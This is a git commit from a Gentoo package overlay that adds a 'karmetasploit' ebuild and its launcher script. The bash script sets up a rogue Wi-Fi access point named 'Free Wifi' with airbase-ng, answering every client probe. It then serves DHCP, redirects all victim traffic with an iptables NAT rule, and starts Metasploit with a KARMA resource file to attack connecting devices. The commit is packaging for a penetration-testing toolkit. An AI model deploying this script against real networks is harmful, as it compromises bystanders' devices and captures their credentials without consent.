22a484f1022683281fd2ed84b0132123832e8ab1
Zero_Chaos <zerochaos-@users.noreply.github.com>
2009-07-30 23:45:25 +0000

    karmetasploit

---
+++ net-wireless/karmetasploit/files/karmeta.sh
@@ -0,0 +1,30 @@
+#!/bin/bash
+echo "karmetasploit script by kingtuna: super ultra mega alpha version"
+echo "warning: this currently leaves your system in a funny state."
+echo "you may have to remove monitor interfaces and kill dhcpd and airbase-ng manually"
+killall -9 airbase-ng dhcpd
+iptables --flush
+
+#airmon-ng stop mon0
+if [ x"$1" != x ]
+then
+airmon-ng start $1
+else
+echo "Please specify a device to use as AP"
+exit
+fi
+
+#modprobe tun
+
+/usr/sbin/airbase-ng -P -C 30 -c 6 -e "Free Wifi" -v mon0 > /dev/null 2>&1 &
+sleep 2 
+ifconfig at0 up 10.0.0.1 netmask 255.255.255.0
+ifconfig eth0 up 10.0.0.1 netmask 255.255.255.0
+ifconfig mon0 up 10.0.0.1 netmask 255.255.255.0
+route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
+sleep 2
+/usr/sbin/dhcpd -cf /etc/karmeta-dhcpd.conf
+sleep 2
+ifconfig at0 mtu 1400
+iptables -t nat -A PREROUTING -i at0 -j REDIRECT
+/usr/bin/msfconsole3 -r /etc/karma.rc
---
+++ net-wireless/karmetasploit/karmetasploit-0.1.ebuild
@@ -0,0 +1,30 @@
+# Copyright 1999-2009 Gentoo Foundation
+# Distributed under the terms of the GNU General Public License v2
+# $Header: $
+
+DESCRIPTION="KARMA + Metasploit 3 == Karmetasploit"
+#karmetasploit + kingtuna script
+HOMEPAGE="http://trac.metasploit.com/wiki/Karmetasploit"
+#SRC_URI="${FILESDIR}/karma.rc
+#	${FILESDIR}/karmeta.sh"
+
+LICENSE="GPL-2"
+KEYWORDS="amd64 x86"
+SLOT="0"
+
+IUSE=""
+
+DEPEND=""
+RDEPEND="net-analyzer/metasploit
+	net-wireless/aircrack-ng
+	net-misc/dhcp"
+
+src_install() {
+    dodir /usr/sbin
+    insinto /usr/sbin
+    doins ${FILESDIR}/karmeta.sh
+
+    dodir /etc
+    insinto /etc
+    doins ${FILESDIR}/karmeta-dhcpd.conf ${FILESDIR}/karma.rc
+}
